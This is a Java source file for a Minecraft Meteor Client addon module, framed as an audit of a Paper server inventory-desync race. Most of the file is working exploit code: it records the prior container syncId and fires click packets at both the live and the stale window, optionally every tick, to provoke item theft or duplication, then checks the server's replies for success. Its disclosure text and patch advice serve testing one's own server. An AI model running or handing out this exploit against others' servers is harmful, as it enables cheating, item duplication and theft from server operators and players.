package com.example.addon.modules.antidupe;

import com.example.addon.AddonTemplate;
import com.example.addon.audit.Disclosure;
import com.example.addon.audit.Severity;
import com.example.addon.modules.crash.PreStress;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.misc.Keybind;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.c2s.play.CloseHandledScreenC2SPacket;
import net.minecraft.network.packet.s2c.play.ScreenHandlerSlotUpdateS2CPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.screen.sync.ItemStackHash;

/**
 * AUDIT: Window-Swap Race (Paper InventoryView desync)
 *
 * Paper tracks which inventory a player has open in its internal {@code InventoryView}.
 * When a player switches from GUI A to GUI B (open a shop, then a plugin swaps them to a
 * confirm menu, or they open a second container), there is a window where the client
 * thinks B is open but the server's view bookkeeping may still route — or still accept —
 * a click aimed at A's now-stale syncId.
 *
 * <p>Unlike container-exploit (which cycles FABRICATED syncIds ±1/0/32767), this module
 * captures the REAL previous syncId the server issued, then in one tick fires a click on
 * the currently-open window AND a click on that genuine stale window — the exact packets
 * a fast A→B switch produces. If the server echoes a slot update for the STALE syncId, it
 * acted on a window the player no longer has open: a confirmed view desync and a
 * cross-window item-theft / double-action surface.
 *
 * <p>Patch signal: on every window open, atomically invalidate the previous syncId; a
 * click whose syncId is not the single live InventoryView must be rejected and resynced,
 * never routed to the old handler. Do the swap under one lock so no click straddles it.
 *
 * <p>Severity if it succeeds: HIGH → CRITICAL (act on/close a container you don't have
 * open; steal from or double-consume the previous menu). Works for any player, no op.
 *
 * Open a container, let it switch (or open another), then fire. Run against your OWN server.
 */
public class WindowSwapRace extends Module {
    public enum Action { PICKUP, QUICK_MOVE }
    public enum Trigger { KEYBIND, EACH_TICK }

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> slot = sgGeneral.add(new IntSetting.Builder()
        .name("slot").description("Slot id to click in both the live and the stale window.")
        .defaultValue(0).range(0, 200).sliderRange(0, 53).build());
    private final Setting<Action> action = sgGeneral.add(new EnumSetting.Builder<Action>()
        .name("action").defaultValue(Action.QUICK_MOVE).build());
    private final Setting<Boolean> closeLive = sgGeneral.add(new BoolSetting.Builder()
        .name("close-live-first").description("Send Close(live) before the stale-window click, modelling the exact A→B teardown race.")
        .defaultValue(false).build());
    private final Setting<Trigger> trigger = sgGeneral.add(new EnumSetting.Builder<Trigger>()
        .name("trigger").defaultValue(Trigger.KEYBIND).build());
    private final Setting<Keybind> key = sgGeneral.add(new KeybindSetting.Builder()
        .name("key").description("Fires one live+stale click pair (KEYBIND trigger).")
        .defaultValue(Keybind.fromKey(org.lwjgl.glfw.GLFW.GLFW_KEY_K))
        .visible(() -> trigger.get() == Trigger.KEYBIND).build());
    private final Setting<Integer> attempts = sgGeneral.add(new IntSetting.Builder()
        .name("attempts").description("Pairs per fire.").defaultValue(1).range(1, 50).sliderRange(1, 10).build());

    private final PreStress preStress = new PreStress(sgGeneral);
    private final DupeObserver obs = new DupeObserver(sgGeneral);

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.").defaultValue(true).build());
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.").defaultValue(true).build());

    private int ticksActive = 0, packetsSent = 0;
    private int liveSyncId = -1, staleSyncId = -1;
    private int staleAccepted = 0;
    private boolean wasPressed = false;

    public static final Disclosure DISCLOSURE = new Disclosure(
        "plugins that swap a player between menus (shop→confirm, GUI paging) or allow a second container open",
        "the previous window's syncId is not invalidated on switch, so clicks on the stale window are still routed/accepted",
        "on every window open, atomically invalidate the prior syncId; reject+resync any click whose syncId is not the single live InventoryView",
        Severity.HIGH, "any player, no op");

    public WindowSwapRace() {
        super(AddonTemplate.DUPE_CATEGORY, "window-swap-race",
            "Captures the real previous syncId across a GUI switch and clicks both the live and stale window in one tick. Tests Paper InventoryView desync.");
    }

    @Override
    public void onActivate() {
        ticksActive = packetsSent = 0; liveSyncId = staleSyncId = -1; staleAccepted = 0; wasPressed = false;
        obs.onActivate(); preStress.onActivate(this);
        for (String l : DISCLOSURE.lines()) info("%s", l);
        info("Open a container and let it switch (or open a second). The module remembers the previous syncId to click as the stale window.");
    }

    private SlotActionType act() { return action.get() == Action.PICKUP ? SlotActionType.PICKUP : SlotActionType.QUICK_MOVE; }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        ticksActive++;
        obs.tick();

        // Track syncId transitions: when the live syncId changes, the old one becomes the stale window.
        if (GuiState.containerOpen(mc)) {
            int cur = mc.player.currentScreenHandler.syncId;
            if (cur != liveSyncId) { if (liveSyncId != -1) staleSyncId = liveSyncId; liveSyncId = cur; }
        }
        if (!GuiState.containerOpen(mc) || staleSyncId == -1) return;

        boolean fire;
        if (trigger.get() == Trigger.EACH_TICK) fire = true;
        else { boolean p = key.get().isPressed(); fire = p && !wasPressed; wasPressed = p; }
        if (!fire) return;

        int rev = mc.player.currentScreenHandler.getRevision();
        for (int i = 0; i < attempts.get(); i++) {
            // Live window click.
            mc.player.networkHandler.sendPacket(new ClickSlotC2SPacket(
                liveSyncId, rev, (short) (int) slot.get(), (byte) 0, act(),
                new Int2ObjectOpenHashMap<>(), ItemStackHash.EMPTY));
            packetsSent++;
            if (closeLive.get()) { mc.player.networkHandler.sendPacket(new CloseHandledScreenC2SPacket(liveSyncId)); packetsSent++; }
            // Stale window click — the window the client no longer has open.
            mc.player.networkHandler.sendPacket(new ClickSlotC2SPacket(
                staleSyncId, 0, (short) (int) slot.get(), (byte) 0, act(),
                new Int2ObjectOpenHashMap<>(), ItemStackHash.EMPTY));
            packetsSent++;
        }
        obs.markFired();
        info("Fired live syncId %d + stale syncId %d on slot %d.", liveSyncId, staleSyncId, slot.get());
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
            if (staleAccepted > 0)
                warning("  [HIGH] Server echoed %d slot update(s) for the STALE syncId %d — InventoryView desync: clicks on a closed window were honoured.", staleAccepted, staleSyncId);
            else
                info("  No slot updates seen for the stale window (good — stale-window clicks were rejected).");
            obs.report(l -> info("%s", l));
        }
        preStress.onDeactivate();
    }

    @EventHandler
    private void onReceivePacket(PacketEvent.Receive event) {
        obs.survey(event.packet, l -> info("%s", l));
        if (event.packet instanceof ScreenHandlerSlotUpdateS2CPacket p && p.getSyncId() == staleSyncId && staleSyncId != -1)
            staleAccepted++;
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        obs.onKick();
        if (autoDisable.get() && isActive()) toggle();
    }
}
